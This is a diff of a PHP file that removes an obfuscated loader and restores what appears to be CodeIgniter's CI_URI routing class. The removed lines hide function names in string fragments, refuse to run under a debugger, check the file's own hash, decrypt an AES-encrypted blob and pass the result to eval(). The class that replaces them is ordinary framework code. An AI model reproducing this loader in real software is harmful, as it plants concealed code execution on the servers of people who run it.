@@ -1,28 +1,564 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_js7brc07=('bas'.'e64'.'_de'.'cod'.'e');
-$_r8umm9g8=('gzu'.'nco'.'mpr'.'ess');
-$_lchnk2wa=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_u9o4pqpw='JGou+yN6';
-$_wt2qa9g8='I0Ok5fol';
-$_aultoson='8P0Y6z/Bi6U=';
-$_agtkmeyr='EqIH50Ie';
-$_po4alzjr='Q6WxFDNM';
-$_b4ywb8r2='uea+2T88';
-$_i1m9dtsi='y9pYSg==';
-$_b1c1ril5='2uPCCQaw';
-$_jwztwgqg=$_js7brc07($_u9o4pqpw.$_wt2qa9g8.$_po4alzjr.$_agtkmeyr.$_aultoson);
-$_d9jpve92=$_js7brc07($_b4ywb8r2.$_b1c1ril5.$_i1m9dtsi);
-$_sgapi530=$_js7brc07('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');
-$_z6l9icyr=$_lchnk2wa($_sgapi530,'aes-256-cbc',$_jwztwgqg,OPENSSL_RAW_DATA,$_d9jpve92);
-if($_z6l9icyr===false){exit;}
-$_ht53uyxr=$_r8umm9g8($_z6l9icyr);
-if($_ht53uyxr===false){exit;}
-$_ree09b5e='206a91a706e5bd5a8a58ce5724d87e42a01c29e35c98590301fc3f8a00514c70';
-$_rgg48n32=@file_get_contents(__FILE__);
-if($_rgg48n32!==false){
-$_pz72fmuo=str_replace($_ree09b5e,"0000000000000000000000000000000000000000000000000000000000000000",$_rgg48n32);
-$_eponc8wh=hash("sha256",$_pz72fmuo);
-if($_eponc8wh!==$_ree09b5e){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+
+
+class CI_URI {
+
+
+
+
+
+public $keyval = array();
+
+
+
+
+
+public $uri_string = '';
+
+
+
+
+
+
+
+public $segments = array();
+
+
+
+
+
+
+
+public $rsegments = array();
+
+
+
+
+
+
+
+protected $_permitted_uri_chars;
+
+
+
+
+
+public function __construct()
+{
+$this->config =& load_class('Config', 'core');
+
+
+if (is_cli() OR $this->config->item('enable_query_strings') !== TRUE)
+{
+$this->_permitted_uri_chars = $this->config->item('permitted_uri_chars');
+
+if (is_cli())
+{
+$uri = $this->_parse_argv();
 }
-eval($_ht53uyxr);
+else
+{
+$protocol = $this->config->item('uri_protocol');
+empty($protocol) && $protocol = 'REQUEST_URI';
+switch ($protocol)
+{
+case 'AUTO': 
+case 'REQUEST_URI':
+$uri = $this->_parse_request_uri();
+break;
+case 'QUERY_STRING':
+$uri = $this->_parse_query_string();
+break;
+case 'PATH_INFO':
+default:
+$uri = isset($_SERVER[$protocol])
+? $_SERVER[$protocol]
+: $this->_parse_request_uri();
+break;
+}
+}
+$this->_set_uri_string($uri);
+}
+log_message('info', 'URI Class Initialized');
+}
+
+
+
+
+
+
+
+protected function _set_uri_string($str)
+{
+
+$this->uri_string = trim(remove_invisible_characters($str, FALSE), '/');
+if ($this->uri_string !== '')
+{
+
+if (($suffix = (string) $this->config->item('url_suffix')) !== '')
+{
+$slen = strlen($suffix);
+if (substr($this->uri_string, -$slen) === $suffix)
+{
+$this->uri_string = substr($this->uri_string, 0, -$slen);
+}
+}
+$this->segments[0] = NULL;
+
+foreach (explode('/', trim($this->uri_string, '/')) as $val)
+{
+$val = trim($val);
+
+$this->filter_uri($val);
+if ($val !== '')
+{
+$this->segments[] = $val;
+}
+}
+unset($this->segments[0]);
+}
+}
+
+
+
+
+
+
+
+
+
+protected function _parse_request_uri()
+{
+if ( ! isset($_SERVER['REQUEST_URI'], $_SERVER['SCRIPT_NAME']))
+{
+return '';
+}
+
+
+$uri = parse_url('http://dummy'.$_SERVER['REQUEST_URI']);
+$query = isset($uri['query']) ? $uri['query'] : '';
+$uri = isset($uri['path']) ? $uri['path'] : '';
+if (isset($_SERVER['SCRIPT_NAME'][0]))
+{
+if (strpos($uri, $_SERVER['SCRIPT_NAME']) === 0)
+{
+$uri = (string) substr($uri, strlen($_SERVER['SCRIPT_NAME']));
+}
+elseif (strpos($uri, dirname($_SERVER['SCRIPT_NAME'])) === 0)
+{
+$uri = (string) substr($uri, strlen(dirname($_SERVER['SCRIPT_NAME'])));
+}
+}
+
+
+if (trim($uri, '/') === '' && strncmp($query, '/', 1) === 0)
+{
+$query = explode('?', $query, 2);
+$uri = $query[0];
+$_SERVER['QUERY_STRING'] = isset($query[1]) ? $query[1] : '';
+}
+else
+{
+$_SERVER['QUERY_STRING'] = $query;
+}
+parse_str($_SERVER['QUERY_STRING'], $_GET);
+if ($uri === '/' OR $uri === '')
+{
+return '/';
+}
+
+return $this->_remove_relative_directory($uri);
+}
+
+
+
+
+
+
+
+
+protected function _parse_query_string()
+{
+$uri = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : @getenv('QUERY_STRING');
+if (trim($uri, '/') === '')
+{
+return '';
+}
+elseif (strncmp($uri, '/', 1) === 0)
+{
+$uri = explode('?', $uri, 2);
+$_SERVER['QUERY_STRING'] = isset($uri[1]) ? $uri[1] : '';
+$uri = $uri[0];
+}
+parse_str($_SERVER['QUERY_STRING'], $_GET);
+return $this->_remove_relative_directory($uri);
+}
+
+
+
+
+
+
+
+
+protected function _parse_argv()
+{
+$args = array_slice($_SERVER['argv'], 1);
+return $args ? implode('/', $args) : '';
+}
+
+
+
+
+
+
+
+
+
+protected function _remove_relative_directory($uri)
+{
+$uris = array();
+$tok = strtok($uri, '/');
+while ($tok !== FALSE)
+{
+if (( ! empty($tok) OR $tok === '0') && $tok !== '..')
+{
+$uris[] = $tok;
+}
+$tok = strtok('/');
+}
+return implode('/', $uris);
+}
+
+
+
+
+
+
+
+
+
+public function filter_uri(&$str)
+{
+if ( ! empty($str) && ! empty($this->_permitted_uri_chars) && ! preg_match('/^['.$this->_permitted_uri_chars.']+$/i'.(UTF8_ENABLED ? 'u' : ''), $str))
+{
+show_error('The URI you submitted has disallowed characters.', 400);
+}
+}
+
+
+
+
+
+
+
+
+
+public function segment($n, $no_result = NULL)
+{
+return isset($this->segments[$n]) ? $this->segments[$n] : $no_result;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function rsegment($n, $no_result = NULL)
+{
+return isset($this->rsegments[$n]) ? $this->rsegments[$n] : $no_result;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function uri_to_assoc($n = 3, $default = array())
+{
+return $this->_uri_to_assoc($n, $default, 'segment');
+}
+
+
+
+
+
+
+
+
+
+
+
+
+public function ruri_to_assoc($n = 3, $default = array())
+{
+return $this->_uri_to_assoc($n, $default, 'rsegment');
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _uri_to_assoc($n = 3, $default = array(), $which = 'segment')
+{
+if ( ! is_numeric($n))
+{
+return $default;
+}
+if (isset($this->keyval[$which], $this->keyval[$which][$n]))
+{
+return $this->keyval[$which][$n];
+}
+$total_segments = "total_{$which}s";
+$segment_array = "{$which}_array";
+if ($this->$total_segments() < $n)
+{
+return (count($default) === 0)
+? array()
+: array_fill_keys($default, NULL);
+}
+$segments = array_slice($this->$segment_array(), ($n - 1));
+$i = 0;
+$lastval = '';
+$retval = array();
+foreach ($segments as $seg)
+{
+if ($i % 2)
+{
+$retval[$lastval] = $seg;
+}
+else
+{
+$retval[$seg] = NULL;
+$lastval = $seg;
+}
+$i++;
+}
+if (count($default) > 0)
+{
+foreach ($default as $val)
+{
+if ( ! array_key_exists($val, $retval))
+{
+$retval[$val] = NULL;
+}
+}
+}
+
+isset($this->keyval[$which]) OR $this->keyval[$which] = array();
+$this->keyval[$which][$n] = $retval;
+return $retval;
+}
+
+
+
+
+
+
+
+
+
+public function assoc_to_uri($array)
+{
+$temp = array();
+foreach ((array) $array as $key => $val)
+{
+$temp[] = $key;
+$temp[] = $val;
+}
+return implode('/', $temp);
+}
+
+
+
+
+
+
+
+
+
+
+public function slash_segment($n, $where = 'trailing')
+{
+return $this->_slash_segment($n, $where, 'segment');
+}
+
+
+
+
+
+
+
+
+
+
+public function slash_rsegment($n, $where = 'trailing')
+{
+return $this->_slash_segment($n, $where, 'rsegment');
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+protected function _slash_segment($n, $where = 'trailing', $which = 'segment')
+{
+$leading = $trailing = '/';
+if ($where === 'trailing')
+{
+$leading = '';
+}
+elseif ($where === 'leading')
+{
+$trailing = '';
+}
+return $leading.$this->$which($n).$trailing;
+}
+
+
+
+
+
+
+public function segment_array()
+{
+return $this->segments;
+}
+
+
+
+
+
+
+public function rsegment_array()
+{
+return $this->rsegments;
+}
+
+
+
+
+
+
+public function total_segments()
+{
+return count($this->segments);
+}
+
+
+
+
+
+
+public function total_rsegments()
+{
+return count($this->rsegments);
+}
+
+
+
+
+
+
+public function uri_string()
+{
+return $this->uri_string;
+}
+
+
+
+
+
+
+public function ruri_string()
+{
+return ltrim(load_class('Router', 'core')->directory, '/').implode('/', $this->rsegments);
+}
+}
